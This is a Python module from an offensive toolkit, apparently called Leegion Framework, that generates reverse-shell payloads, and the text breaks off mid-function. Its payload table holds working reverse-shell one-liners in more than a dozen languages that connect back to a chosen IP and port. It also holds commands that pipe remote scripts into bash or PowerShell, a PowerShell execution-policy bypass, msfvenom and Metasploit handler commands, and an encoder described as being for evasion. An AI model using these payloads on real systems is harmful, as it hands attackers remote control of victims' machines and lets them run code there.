"""
Reverse Shell Generator module for Leegion Framework
Comprehensive reverse shell payloads in multiple languages and formats

Author: Leegion
Project: Leegion Framework v2.0
Copyright (c) 2025 Leegion. All rights reserved.
"""

import json
import os
import socket
import subprocess
import base64
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime
from core.base_module import BaseModule
from core.banner import print_module_header


class ReverseShellGenerator(BaseModule):
    """Reverse shell generator with comprehensive payloads in multiple languages"""

    def __init__(self, config: Dict[str, Any]):
        super().__init__(config, "Reverse_Shell_Generator")
        self.payloads = {}
        self.favorites = set()
        self.history = []
        self.load_payloads()

    def load_payloads(self):
        """Load reverse shell payloads from internal data"""
        self.payloads = {
            "bash": {
                "basic": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
                "with_nc": "nc -e /bin/bash {ip} {port}",
                "with_nc_alt": "nc {ip} {port} -e /bin/bash",
                "with_socat": "socat tcp-connect:{ip}:{port} exec:bash,pty,stderr,setsid,sigint,sane",
                "with_python": "python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i']);\"",
                "encoded": "echo {b64_payload} | base64 -d | bash",
                "one_liner": 'bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"',
            },
            "python": {
                "basic": "python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i']);\"",
                "python2": "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i']);\"",
                "with_pty": "python3 -c \"import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash');\"",
                "encoded": "python3 -c \"import base64;exec(base64.b64decode('{b64_payload}'))\"",
                "oneliner": "python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{ip}',{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(['/bin/bash']);\"",
            },
            "powershell": {
                "basic": "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
                "encoded": "powershell -enc {b64_payload}",
                "bypass": "powershell -ExecutionPolicy Bypass -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
                "nishang": "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}\"",
            },
            "php": {
                "basic": 'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/bash -i <&3 >&3 2>&3");\'',
                "with_shell": 'php -r \'$sock=fsockopen("{ip}",{port});shell_exec("/bin/bash -i <&3 >&3 2>&3");\'',
                "system": 'php -r \'$sock=fsockopen("{ip}",{port});system("/bin/bash -i <&3 >&3 2>&3");\'',
                "passthru": 'php -r \'$sock=fsockopen("{ip}",{port});passthru("/bin/bash -i <&3 >&3 2>&3");\'',
                "web_shell": '<?php $sock=fsockopen("{ip}",{port});exec("/bin/bash -i <&3 >&3 2>&3");?>',
            },
            "perl": {
                "basic": 'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");}};\'',
                "with_sh": 'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
                "oneliner": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
            },
            "ruby": {
                "basic": 'ruby -rsocket -e\'exit if fork;c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\'',
                "with_bash": 'ruby -rsocket -e\'exit if fork;c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\'',
                "oneliner": 'ruby -rsocket -e\'c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\'',
            },
            "java": {
                "basic": 'r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[]); p.waitFor();',
                "with_socket": 'String host="{ip}"; int port={port}; String cmd="/bin/bash"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(si.available()>0)po.write(si.read());while(pe.available()>0)so.write(pe.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}};}};p.destroy();s.close();',
            },
            "golang": {
                "basic": 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}',
                "with_sh": 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}',
            },
            "lua": {
                "basic": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/bash -i <&3 >&3 2>&3');\""
            },
            "nodejs": {
                "basic": "node -e \"require('child_process').exec('bash -i >& /dev/tcp/{ip}/{port} 0>&1')\"",
                "with_socket": "node -e \"var net = require('net');var spawn = require('child_process').spawn;HOST='{ip}';PORT='{port}';TIMEOUT='5000';if (typeof String.prototype.contains === 'undefined') {{ String.prototype.contains = function(it) {{ return this.indexOf(it) != -1; }}; }}function c(HOST,PORT) {{ var client = new net.Socket(); client.connect(PORT, HOST, function() {{ var sh = spawn('/bin/bash',[]); client.write('Connected\\n'); client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);sh.on('exit',function(code,signal){{ client.end('Disconnected\\n'); }}); }}); client.on('error', function(e) {{ setTimeout(function() {{c(HOST,PORT);}}, TIMEOUT); }}); }} c(HOST,PORT);\"",
            },
            "telnet": {
                "basic": "telnet {ip} {port} | /bin/bash | telnet {ip} {port}",
                "with_nc": "nc {ip} {port} | /bin/bash | nc {ip} {port}",
            },
            "awk": {
                "basic": 'awk \'BEGIN {{s = "/inet/tcp/0/{ip}/{port}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}\' /dev/null'
            },
            "curl": {
                "basic": "curl -s http://{ip}:{port}/shell.sh | bash",
                "with_wget": "wget -qO- http://{ip}:{port}/shell.sh | bash",
            },
            "msfvenom": {
                "linux_x86": "msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf > shell.elf",
                "linux_x64": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf > shell.elf",
                "windows_x86": "msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe > shell.exe",
                "windows_x64": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe > shell.exe",
                "php": "msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -f raw > shell.php",
                "asp": "msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f asp > shell.asp",
                "jsp": "msfvenom -p java/shell_reverse_tcp LHOST={ip} LPORT={port} -f war > shell.war",
            },
            "metasploit": {
                "handler": "use exploit/multi/handler\nset PAYLOAD windows/shell_reverse_tcp\nset LHOST {ip}\nset LPORT {port}\nexploit",
                "web_delivery": "use exploit/multi/script/web_delivery\nset TARGET 2\nset PAYLOAD python/meterpreter/reverse_tcp\nset LHOST {ip}\nset LPORT {port}\nexploit",
            },
        }

    def run(self):
        """Main reverse shell generator interface"""
        print_module_header(
            "Reverse Shell Generator", "Multi-Language Reverse Shell Payloads"
        )

        while True:
            self._display_generator_menu()
            choice = self.get_user_input("Select option: ")

            if not choice:
                continue

            if choice == "1":
                self._generate_payloads()
            elif choice == "2":
                self._listener_setup()
            elif choice == "3":
                self._payload_categories()
            elif choice == "4":
                self._custom_payloads()
            elif choice == "5":
                self._payload_favorites()
            elif choice == "6":
                self._encode_payloads()
            elif choice == "7":
                self._payload_history()
            elif choice == "8":
                self._export_payloads()
            elif choice == "9":
                self._payload_education()
            elif choice == "10":
                break
            else:
                # Check if user entered a language name directly
                if self._try_direct_language_selection(choice):
                    continue
                else:
                    self.print_error("Invalid selection. Please try again.")

    def _display_generator_menu(self):
        """Display reverse shell generator menu"""
        favorites_count = len(self.favorites)
        history_count = len(self.history)

        print(f"\n\033[93m{'='*65}\033[0m")
        print(f"\033[93m{'REVERSE SHELL GENERATOR'.center(65)}\033[0m")
        print(f"\033[93m{'='*65}\033[0m")
        print(f"\033[96mFavorite Payloads:\033[0m {favorites_count}")
        print(f"\033[96mHistory:\033[0m {history_count}")
        print(
            f"\033[93m🎯 BEGINNER TIP:\033[0m Practice reverse shells on \033[92mtryhackme.com\033[0m"
        )
        print(f"\033[93m{'-'*65}\033[0m")
        print("\033[96m 1.\033[0m Generate Payloads")
        print("\033[96m 2.\033[0m Listener Setup")
        print("\033[96m 3.\033[0m Payload Categories")
        print("\033[96m 4.\033[0m Custom Payloads")
        print("\033[96m 5.\033[0m Payload Favorites")
        print("\033[96m 6.\033[0m Encode Payloads")
        print("\033[96m 7.\033[0m Payload History")
        print("\033[96m 8.\033[0m Export Payloads")
        print("\033[96m 9.\033[0m Educational Resources")
        print("\033[96m10.\033[0m Back to Main Menu")
        print(f"\033[93m{'='*65}\033[0m")
        print(
            "\033[93m💡 TIP:\033[0m You can also enter a language name directly (e.g., 'php', 'python', 'bash')"
        )
        print(f"\033[93m{'='*65}\033[0m")

    def _generate_payloads(self):
        """Generate reverse shell payloads"""
        print("\n\033[96mReverse Shell Payload Generator\033[0m")
        print("=" * 40)

        # Get target information
        ip = self.get_user_input("Enter target IP address: ")
        if not ip:
            self.print_error("IP address is required")
            return

        port = self.get_user_input("Enter target port (default: 4444): ")
        if not port:
            port = "4444"

        try:
            port_int = int(port)
            if not (1 <= port_int <= 65535):
                raise ValueError("Port out of range")
            port = port_int
        except ValueError:
            self.print_error("Invalid port number")
            return

        # Get payload type
        print("\nAvailable payload types:")
        languages = list(self.payloads.keys())
        for i, lang in enumerate(languages, 1):
            print(f"\033[96m{i:2d}.\033[0m {lang.upper()}")

        choice = self.get_user_input(f"Select language (1-{len(languages)}): ")

        if not choice:
            return

        try:
            choice_idx = int(choice) - 1
            if 0 <= choice_idx < len(languages):
                selected_lang = languages[choice_idx]
                self._display_language_payloads(selected_lang, ip, port)
            else:
                self.print_error("Invalid selection")
        except ValueError:
            self.print_error("Invalid input")

    def _display_language_payloads(self, language: str, ip: str, port: int):
        """Display all payloads for a specific language"""
        print(f"\n\033[93m{language.upper()} Reverse Shell Payloads\033[0m")
        print("=" * 50)

        lang_payloads = self.payloads.get(language, {})

        for payload_type, payload in lang_payloads.items():
            print(f"\n\033[96m{payload_type.upper()}:\033[0m")

            # Format the payload with IP and port
            formatted_payload = payload.format(ip=ip, port=port)

            # For encoded payloads, we need to generate the base64
            if "{b64_payload}" in formatted_payload:
                if language == "bash":
                    basic_payload = self.payloads["bash"]["basic"].format(
                        ip=ip, port=port
                    )
                    b64_payload = base64.b64encode(basic_payload.encode()).decode()
                    formatted_payload = formatted_payload.format(
                        b64_payload=b64_payload
                    )
                elif language == "python":
                    basic_payload = self.payloads["python"]["basic"].format(
                        ip=ip, port=port
                    )
                    b64_payload = base64.b64encode(basic_payload.encode()).decode()
                    formatted_payload = formatted_payload.format(
                        b64_payload=b64_payload
                    )
                elif language == "powershell":
                    basic_payload = self.payloads["powershell"]["basic"].format(
                        ip=ip, port=port
                    )
                    b64_payload = base64.b64encode(
                        basic_payload.encode("utf-16le")
                    ).decode()
                    formatted_payload = formatted_payload.format(
                        b64_payload=b64_payload
                    )

            print(f"\033[92m{formatted_payload}\033[0m")

            # Add to history
            self._add_to_history(language, payload_type, formatted_payload, ip, port)

            # Ask if user wants to save to favorites
            save = self.get_user_input("Add to favorites? (y/N): ")
            if save.lower() == "y":
                self.favorites.add(
                    (language, payload_type, formatted_payload, ip, port)
                )
                self.print_success("Added to favorites!")

        # Show listener command
        self._show_listener_command(port)

    def _try_direct_language_selection(self, choice: str) -> bool:
        """Try to handle direct language selection from main menu"""
        choice_lower = choice.lower()

        # Check if the choice is a valid language
        if choice_lower in self.payloads:
            print(f"\n\033[93m🎯 Quick Payload Generation for {choice.upper()}\033[0m")
            print("=" * 50)

            # Get target information
            ip = self.get_user_input("Enter target IP address: ")
            if not ip:
                self.print_error("IP address is required")
                return True

            port = self.get_user_input("Enter target port (default: 4444): ")
            if not port:
                port = "4444"

            try:
                port_int = int(port)
                if not (1 <= port_int <= 65535):
                    raise ValueError("Port out of range")
                port = port_int
            except ValueError:
                self.print_error("Invalid port number")
                return True

            # Generate payloads for the selected language
            self._display_language_payloads(choice_lower, ip, port)
            return True

        return False

    def _listener_setup(self):
        """Show listener setup commands"""
        print("\n\033[96mReverse Shell Listener Setup\033[0m")
        print("=" * 40)

        port = self.get_user_input("Enter port to listen on (default: 4444): ")
        if not port:
            port = "4444"

        print(f"\n\033[93mListener Commands for Port {port}:\033[0m")
        print("-" * 40)

        listeners = {
            "netcat": f"nc -lvnp {port}",
            "netcat_alt": f"nc -l -p {port} -v",
            "socat": f"socat -d -d TCP-LISTEN:{port},reuseaddr,fork STDOUT",
            "ncat": f"ncat -lvnp {port}",
            "powershell": f"powershell -c \"$listener = [System.Net.Sockets.TcpListener]{port}; $listener.Start(); $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close();$listener.Stop()\"",
            "python": f"python3 -c \"import socket; s=socket.socket(); s.bind(('0.0.0.0',{port})); s.listen(1); c,a=s.accept(); import os; os.dup2(c.fileno(),0); os.dup2(c.fileno(),1); os.dup2(c.fileno(),2); import subprocess; subprocess.call(['/bin/bash','-i']);\"",
        }

        for name, command in listeners.items():
            print(f"\n\033[96m{name.upper()}:\033[0m")
            print(f"\033[92m{command}\033[0m")

        print(
            f"\n\033[93m🎯 TIP:\033[0m Use \033[92mnetcat\033[0m for basic reverse shells"
        )
        print(
            f"\033[93m🎯 TIP:\033[0m Use \033[92msocat\033[0m for more stable connections"
        )

    def _payload_categories(self):
        """Show payloads by category"""
        print("\n\033[96mPayload Categories\033[0m")
        print("=" * 30)

        categories = {
            "Web Shells": ["php", "nodejs"],
            "System Shells": ["bash", "powershell"],
            "Scripting": ["python", "perl", "ruby"],
            "Compiled": ["java", "golang"],
            "Network Tools": ["telnet", "curl"],
            "System Utils": ["awk", "lua"],
        }

        # Display numbered categories
        category_list = list(categories.keys())
        for i, category in enumerate(category_list, 1):
            print(f"\n\033[96m{i}.\033[0m \033[93m{category}:\033[0m")
            for lang in categories[category]:
                print(f"    \033[96m•\033[0m {lang.upper()}")

        print(
            f"\n\033[93mOr enter a specific language (e.g., 'php', 'python', 'bash')\033[0m"
        )
        choice = self.get_user_input("\nSelect category or language: ")

        if not choice:
            return

        # Find category - more flexible matching
        selected_langs = []
        choice_lower = choice.lower()

        # First try numbered category selection
        try:
            choice_num = int(choice)
            if 1 <= choice_num <= len(category_list):
                selected_category = category_list[choice_num - 1]
                selected_langs = categories[selected_category]
        except ValueError:
            # Not a number, try text matching
            # First try exact category match
            for category, langs in categories.items():
                if choice_lower == category.lower():
                    selected_langs = langs
                    break

            # If no exact match, try partial category match
            if not selected_langs:
                for category, langs in categories.items():
                    if choice_lower in category.lower():
                        selected_langs = langs
                        break

            # If still no match, try language match
            if not selected_langs:
                for category, langs in categories.items():
                    if choice_lower in [lang.lower() for lang in langs]:
                        selected_langs = langs
                        break

        if selected_langs:
            self._interactive_payload_selection(selected_langs, choice)
        else:
            self.print_error(f"Category '{choice}' not found")
            print("\n\033[93mAvailable categories:\033[0m")
            for category in categories.keys():
                print(f"  \033[96m•\033[0m {category}")
            print(
                "\n\033[93mOr try entering a specific language (e.g., 'php', 'python', 'bash')\033[0m"
            )

    def _interactive_payload_selection(
        self, selected_langs: List[str], category_name: str
    ):
        """Interactive payload selection for categories"""
        print(f"\n\033[93m🎯 Interactive Payload Selection for {category_name}\033[0m")
        print("=" * 60)

        # Get target information first
        ip = self.get_user_input("Enter target IP address: ")
        if not ip:
            self.print_error("IP address is required")
            return

        port = self.get_user_input("Enter target port (default: 4444): ")
        if not port:
            port = "4444"

        try:
            port_int = int(port)
            if not (1 <= port_int <= 65535):
                raise ValueError("Port out of range")
            port = port_int
        except ValueError:
            self.print_error("Invalid port number")
            return

        while True:
            print(f"\n\033[93mAvailable payloads for {category_name}:\033[0m")
            print("-" * 50)

            # Display all available payloads with numbers
            payload_options = []
            option_num = 1

            for lang in selected_langs:
                if lang in self.payloads:
                    print(f"\n\033[96m{lang.upper()}:\033[0m")
                    for payload_type in self.payloads[lang].keys():
                        print(f"  \033[96m{option_num:2d}.\033[0m {payload_type}")
                        payload_options.append((lang, payload_type))
                        option_num += 1

            print(
                f"\n\033[93m{option_num:2d}.\033[0m Generate ALL payloads for {category_name}"
            )
            print(f"\033[93m{option_num + 1:2d}.\033[0m Back to category selection")

            choice = self.get_user_input(f"\nSelect payload (1-{option_num + 1}): ")

            if not choice:
                continue

            try:
                choice_num = int(choice)

                if choice_num == option_num:
                    # Generate all payloads
                    print(
                        f"\n\033[93m🎯 Generating ALL payloads for {category_name}\033[0m"
                    )
                    for lang in selected_langs:
                        if lang in self.payloads:
                            self._display_language_payloads(lang, ip, port)
                    break

                elif choice_num == option_num + 1:
                    # Back to category selection
                    break

                elif 1 <= choice_num <= len(payload_options):
                    # Generate specific payload
                    selected_lang, selected_type = payload_options[choice_num - 1]
                    print(
                        f"\n\033[93m🎯 Generating {selected_type.upper()} payload for {selected_lang.upper()}\033[0m"
                    )
                    self._display_single_payload(selected_lang, selected_type, ip, port)
                    break

                else:
                    self.print_error("Invalid selection")

            except ValueError:
                self.print_error("Invalid input")

    def _display_single_payload(
        self, language: str, payload_type: str, ip: str, port: int
    ):
        """Display a single specific payload"""
        print(
            f"\n\033[93m{language.upper()} - {payload_type.upper()} Reverse Shell\033[0m"
        )
        print("=" * 50)

        lang_payloads = self.payloads.get(language, {})
        payload = lang_payloads.get(payload_type, "")

        if not payload:
            self.print_error(f"Payload '{payload_type}' not found for {language}")
            return

        # Format the payload with IP and port
        formatted_payload = payload.format(ip=ip, port=port)

        # Handle encoded payloads
        if "{b64_payload}" in formatted_payload:
            if language == "bash":
                basic_payload = self.payloads["bash"]["basic"].format(ip=ip, port=port)
                b64_payload = base64.b64encode(basic_payload.encode()).decode()
                formatted_payload = formatted_payload.format(b64_payload=b64_payload)
            elif language == "python":
                basic_payload = self.payloads["python"]["basic"].format(
                    ip=ip, port=port
                )
                b64_payload = base64.b64encode(basic_payload.encode()).decode()
                formatted_payload = formatted_payload.format(b64_payload=b64_payload)
            elif language == "powershell":
                basic_payload = self.payloads["powershell"]["basic"].format(
                    ip=ip, port=port
                )
                b64_payload = base64.b64encode(
                    basic_payload.encode("utf-16le")
                ).decode()
                formatted_payload = formatted_payload.format(b64_payload=b64_payload)

        print(f"\n\033[96mPayload:\033[0m")
        print(f"\033[92m{formatted_payload}\033[0m")

        # Add to history
        self._add_to_history(language, payload_type, formatted_payload, ip, port)

        # Ask if user wants to save to favorites
        save = self.get_user_input("\nAdd to favorites? (y/N): ")
        if save.lower() == "y":
            self.favorites.add((language, payload_type, formatted_payload, ip, port))
            self.print_success("Added to favorites!")

        # Show listener command
        self._show_listener_command(port)

    def _custom_payloads(self):
        """Manage custom payloads"""
        print("\n\033[96mCustom Payload Manager\033[0m")
        print("=" * 30)

        print("\033[96m1.\033[0m Add Custom Payload")
        print("\033[96m2.\033[0m View Custom Payloads")
        print("\033[96m3.\033[0m Edit Custom Payload")
        print("\033[96m4.\033[0m Delete Custom Payload")

        choice = self.get_user_input("Select option: ")

        if choice == "1":
            self._add_custom_payload()
        elif choice == "2":
            self._view_custom_payloads()
        elif choice == "3":
            self._edit_custom_payload()
        elif choice == "4":
            self._delete_custom_payload()
        else:
            self.print_error("Invalid selection")

    def _add_custom_payload(self):
        """Add a custom payload"""
        name = self.get_user_input("Enter payload name: ")
        if not name:
            return

        language = self.get_user_input("Enter language: ")
        if not language:
            return

        payload = self.get_user_input(
            "Enter payload template (use {ip} and {port} for variables): "
        )
        if not payload:
            return

        description = self.get_user_input("Enter description: ")

        # Initialize custom payloads if not exists
        if "custom" not in self.payloads:
            self.payloads["custom"] = {}

        self.payloads["custom"][name] = {
            "language": language or "",
            "payload": payload or "",
            "description": description or "",
        }

        self.print_success(f"Custom payload '{name}' added successfully!")

    def _view_custom_payloads(self):
        """View custom payloads"""
        if "custom" not in self.payloads or not self.payloads["custom"]:
            self.print_info("No custom payloads found")
            return

        print("\n\033[93mCustom Payloads:\033[0m")
        for name, data in self.payloads["custom"].items():
            print(f"\n\033[96m{name}:\033[0m")
            print(f"  Language: {data['language']}")
            print(f"  Description: {data['description']}")
            print(f"  Template: \033[92m{data['payload']}\033[0m")

    def _edit_custom_payload(self):
        """Edit a custom payload"""
        if "custom" not in self.payloads or not self.payloads["custom"]:
            self.print_info("No custom payloads to edit")
            return

        print("\nAvailable custom payloads:")
        for i, name in enumerate(self.payloads["custom"].keys(), 1):
            print(f"\033[96m{i}.\033[0m {name}")

        choice = self.get_user_input("Select payload to edit: ")
        try:
            choice_idx = int(choice) - 1
            payload_names = list(self.payloads["custom"].keys())
            if 0 <= choice_idx < len(payload_names):
                name = payload_names[choice_idx]
                self._edit_payload_details(name)
            else:
                self.print_error("Invalid selection")
        except ValueError:
            self.print_error("Invalid input")

    def _edit_payload_details(self, name: str):
        """Edit specific payload details"""
        payload = self.payloads["custom"][name]

        print(f"\nEditing payload: {name}")
        print(f"Current language: {payload['language']}")
        new_lang = self.get_user_input("New language (or Enter to keep current): ")
        if new_lang:
            payload["language"] = new_lang

        print(f"Current description: {payload['description']}")
        new_desc = self.get_user_input("New description (or Enter to keep current): ")
        if new_desc:
            payload["description"] = new_desc

        print(f"Current template: {payload['payload']}")
        new_template = self.get_user_input("New template (or Enter to keep current): ")
        if new_template:
            payload["payload"] = new_template

        self.print_success(f"Payload '{name}' updated successfully!")

    def _delete_custom_payload(self):
        """Delete a custom payload"""
        if "custom" not in self.payloads or not self.payloads["custom"]:
            self.print_info("No custom payloads to delete")
            return

        print("\nAvailable custom payloads:")
        for i, name in enumerate(self.payloads["custom"].keys(), 1):
            print(f"\033[96m{i}.\033[0m {name}")

        choice = self.get_user_input("Select payload to delete: ")
        try:
            choice_idx = int(choice) - 1
            payload_names = list(self.payloads["custom"].keys())
            if 0 <= choice_idx < len(payload_names):
                name = payload_names[choice_idx]
                confirm = self.get_user_input(
                    f"Are you sure you want to delete '{name}'? (y/N): "
                )
                if confirm.lower() == "y":
                    del self.payloads["custom"][name]
                    self.print_success(f"Payload '{name}' deleted successfully!")
            else:
                self.print_error("Invalid selection")
        except ValueError:
            self.print_error("Invalid input")

    def _payload_favorites(self):
        """Manage favorite payloads"""
        if not self.favorites:
            self.print_info("No favorite payloads yet")
            return

        print("\n\033[93mFavorite Payloads:\033[0m")
        print("=" * 30)

        for i, (lang, ptype, payload, ip, port) in enumerate(self.favorites, 1):
            print(f"\n\033[96m{i}. {lang.upper()} - {ptype}\033[0m")
            print(f"   Target: {ip}:{port}")
            print(f"   Payload: \033[92m{payload}\033[0m")

        print(f"\n\033[96m1.\033[0m Remove from favorites")
        print(f"\033[96m2.\033[0m Clear all favorites")

        choice = self.get_user_input("Select option: ")

        if choice == "1":
            self._remove_favorite()
        elif choice == "2":
            confirm = self.get_user_input("Clear all favorites? (y/N): ")
            if confirm.lower() == "y":
                self.favorites.clear()
                self.print_success("All favorites cleared!")

    def _remove_favorite(self):
        """Remove a specific favorite"""
        if not self.favorites:
            return

        choice = self.get_user_input("Enter favorite number to remove: ")
        try:
            choice_idx = int(choice) - 1
            favorites_list = list(self.favorites)
            if 0 <= choice_idx < len(favorites_list):
                removed = favorites_list[choice_idx]
                self.favorites.remove(removed)
                self.print_success(
                    f"Removed favorite: {removed[0].upper()} - {removed[1]}"
                )
            else:
                self.print_error("Invalid selection")
        except ValueError:
            self.print_error("Invalid input")

    def _encode_payloads(self):
        """Encode payloads for evasion"""
        print("\n\033[96mPayload Encoding\033[0m")
        print("=" * 20)

        payload = self.get_user_input("Enter payload to encode: ")
        if not payload:
            return

        print("\n\033[93mEncoded Payloads:\033[0m")

        # Base64 encoding
        try:
            b64_encoded = base64.b64encode(payload.encode()).decode()
            print(f"\n\033[96mBase64:\033[0m")
            print(f"\033[92m{b64_encoded}\033[0m")
        except Exception as e:
            print(f"Base64 encoding failed: {e}")

        # URL encoding
        try:
            url_encoded = (
                payload.replace(" ", "%20").replace("&", "%26").replace("|", "%7C")
            )
            print(f"\n\033[96mURL Encoded:\033[0m")
            print(f"\033[92m{url_encoded}\033[0m")
        except Exception as e:
            print(f"URL encoding failed: {e}")

        # Hex encoding
        try:
            hex_encoded = payload.encode().hex()
            print(f"\n\033[96mHex:\033[0m")
            print(f"\033[92m{hex_encoded}\033[0m")
        except Exception as e:
            print(f"Hex encoding failed: {e}")

    def _payload_history(self):
        """Show payload generation history"""
        if not self.history:
            self.print_info("No payload history yet")
            return

        print("\n\033[93mPayload Generation History\033[0m")
        print("=" * 40)

        for i, (lang, ptype, payload, ip, port, timestamp) in enumerate(
            self.history[-10:], 1
        ):
            print(f"\n\033[96m{i}. {lang.upper()} - {ptype}\033[0m")
            print(f"   Target: {ip}:{port}")
            print(f"   Time: {timestamp}")
            print(
                f"   Payload: \033[92m{payload[:100]}{'...' if len(payload) > 100 else ''}\033[0m"
            )

        if len(self.history) > 10:
            print(f"\n\033[93m... and {len(self.history) - 10} more entries\033[0m")

    def _export_payloads(self):
        """Export payloads to file"""
        print("\n\033[96mExport Payloads\033[0m")
        print("=" * 20)

        print("\033[96m1.\033[0m Export All Payloads")
        print("\033[96m2.\033[0m Export Favorites")
        print("\033[96m3.\033[0m Export History")

        choice = self.get_user_input("Select export option: ")

        if choice == "1":
            self._export_all_payloads()
        elif choice == "2":
            self._export_favorites()
        elif choice == "3":
            self._export_history()
        else:
            self.print_error("Invalid selection")

    def _export_all_payloads(self):
        """Export all payloads to JSON file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"reports/reverse_shell_payloads_{timestamp}.json"

        try:
            os.makedirs("reports", exist_ok=True)

            export_data = {
                "timestamp": timestamp,
                "payloads": self.payloads,
                "favorites": list(self.favorites),
                "history": self.history,
            }

            with open(filename, "w") as f:
                json.dump(export_data, f, indent=2)

            self.print_success(f"All payloads exported to {filename}")
        except Exception as e:
            self.print_error(f"Export failed: {e}")

    def _export_favorites(self):
        """Export favorite payloads"""
        if not self.favorites:
            self.print_info("No favorites to export")
            return

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"reports/favorite_payloads_{timestamp}.txt"

        try:
            os.makedirs("reports", exist_ok=True)

            with open(filename, "w") as f:
                f.write("Leegion Framework - Favorite Reverse Shell Payloads\n")
                f.write("=" * 50 + "\n\n")

                for lang, ptype, payload, ip, port in self.favorites:
